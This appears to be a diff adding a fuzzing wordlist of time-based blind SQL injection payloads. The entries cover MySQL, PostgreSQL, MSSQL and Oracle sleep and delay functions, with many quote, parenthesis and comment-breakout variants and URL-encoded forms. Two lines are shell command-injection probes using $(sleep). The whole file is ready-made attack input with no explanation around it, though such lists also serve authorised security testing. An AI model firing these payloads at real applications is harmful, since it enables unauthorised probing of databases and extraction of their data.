@@ -1,0 +1,142 @@
+' OR SLEEP(18)=0 #
+' OR SLEEP(18)=0/*
+' OR SLEEP(18)=0%23
+' OR SLEEP(18)=0%2F%2A
+' OR WAITFOR DELAY '00:00:18' --
+'; WAITFOR DELAY '00:00:18' --
+') WAITFOR DELAY '00:00:18' --
+' OR WAITFOR DELAY '00:00:18' %23
+' OR dbms_lock.sleep(18)='1' --
+' OR dbms_lock.sleep(18)='1' %23
+' OR dbms_lock.sleep(18)='1' /*
+' OR dbms_lock.sleep(18)='1' %2F%2A
+' OR pg_sleep(18)=0 --
+' OR pg_sleep(18)=0 %23
+' OR pg_sleep(18)=0 /*
+' OR pg_sleep(18)=0 %2F%2A
+(select(0)from(select(sleep(18)))v)/*'+(select(0)from(select(sleep(18)))v)+'\"+(select(0)from(select(sleep(18)))v)+\"*/
+' AND (SELECT 6377 FROM (SELECT(sleep(18)))hLTl)--
+' WAITFOR DELAY '0:0:18'--
+';WAITFOR DELAY '0:0:18'-- 
+')) or sleep(18)='
+;waitfor delay '0:0:18'--
+);waitfor delay '0:0:18'--
+';waitfor delay '0:0:18'--
+";waitfor delay '0:0:18'--
+');waitfor delay '0:0:18'--
+");waitfor delay '0:0:18'--
+));waitfor delay '0:0:18'--
+";waitfor delay '0:0:18'--
+1) or pg_sleep(18)--
+" or sleep(18)#
+pg_sleep(18)--
+1) or sleep(18)#
+1 waitfor delay '0:0:18'--
+) or sleep(18)='
+));waitfor delay '0:0:18'--
+a' waitfor delay '0:0:18'--
+1 or sleep(18)#
+" or pg_sleep(18)--
+"));waitfor delay '0:0:18'--
+%20'sleep%2050'
+1)) or pg_sleep(18)--
+%20$(sleep%2050)
+ or pg_sleep(18)--
+") or sleep(18)="
+) or pg_sleep(18)--
+ or sleep(18)#
+ or sleep(18)='
+;waitfor delay '0:0:18'--
+");waitfor delay '0:0:18'--
+")) or sleep(18)="
+") or pg_sleep(18)--
+1 or pg_sleep(18)--
+)) or pg_sleep(18)--
+1)) or sleep(18)#
+);waitfor delay '0:0:18'--
+)) or sleep(18)='
+")) or pg_sleep(18)--
+')) or sleep(18)='
+;waitfor delay '0:0:18'--
+);waitfor delay '0:0:18'--
+';waitfor delay '0:0:18'--
+";waitfor delay '0:0:18'--
+');waitfor delay '0:0:18'--
+");waitfor delay '0:0:18'--
+));waitfor delay '0:0:18'--
+0'XOR(if(now()=sysdate()%2Csleep(18)%2C0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(18),0))XOR'Z
+1+++((SELECT+1+FROM+(SELECT+SLEEP(18))A))/*'XOR(((SELECT+1+FROM+(SELECT+SLEEP(18))A)))OR'|"XOR(((SELECT+1+FROM+(SELECT+SLEEP(18))A)))OR"*/+/*+60c97910-84e4-41d1-a2ef-cadb84887e89+*/
+(select(0)from(select(sleep(18)))v)/*'+(select(0)from(select(sleep(18)))v)+'"+(select(0)from(select(sleep(18)))v)+"*/
+1;SELECT IF((8303>8302),SLEEP(18),2356)#
+sleep(18)#
+(select * from (select(sleep(18)))a)
+1 or sleep(18)# 
+" or sleep(18)#
+' or sleep(18)#
+" or sleep(18)="
+' or sleep(18)='
+1) or sleep(18)#
+") or sleep(18)="
+') or sleep(18)='
+1)) or sleep(18)#
+")) or sleep(18)="
+')) or sleep(18)='
+;waitfor delay '0:0:18'--
+);waitfor delay '0:0:18'--
+';waitfor delay '0:0:18'--
+";waitfor delay '0:0:18'--
+');waitfor delay '0:0:18'--
+");waitfor delay '0:0:18'--
+));waitfor delay '0:0:18'--
+'));waitfor delay '0:0:18'--
+"));waitfor delay '0:0:18'--
+pg_sleep(18)--
+1 or pg_sleep(18)--
+" or pg_sleep(18)--
+' or pg_sleep(18)--
+1) or pg_sleep(18)--
+") or pg_sleep(18)--
+') or pg_sleep(18)--
+1)) or pg_sleep(18)--
+")) or pg_sleep(18)--
+')) or pg_sleep(18)--
+AND (SELECT * FROM (SELECT(SLEEP(18)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(18)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(18)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(18)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(18)))nQIP)#
+SLEEP(18)#
+SLEEP(18)--
+SLEEP(18)="
+SLEEP(18)='
+or SLEEP(18)
+or SLEEP(18)#
+or SLEEP(18)--
+or SLEEP(18)="
+or SLEEP(18)='
+waitfor delay '00:00:18'
+waitfor delay '00:00:18'--
+waitfor delay '00:00:18'#
+pg_SLEEP(18)
+pg_SLEEP(18)--
+pg_SLEEP(18)#
+or pg_SLEEP(18)
+or pg_SLEEP(18)--
+or pg_SLEEP(18)#
+AnD SLEEP(18)
+AnD SLEEP(18)--
+AnD SLEEP(18)#
+&&SLEEP(18)
+&&SLEEP(18)--
+&&SLEEP(18)#
+' AnD SLEEP(18) ANd '1
+'&&SLEEP(18)&&'1
+ORDER BY SLEEP(18)
+ORDER BY SLEEP(18)--
+ORDER BY SLEEP(18)#
+(SELECT * FROM (SELECT(SLEEP(18)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(18)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(18)))ecMj)--
++ SLEEP(18) + '
+SLEEP(18)/*' or SLEEP(18) or '" or SLEEP(18) or "*/
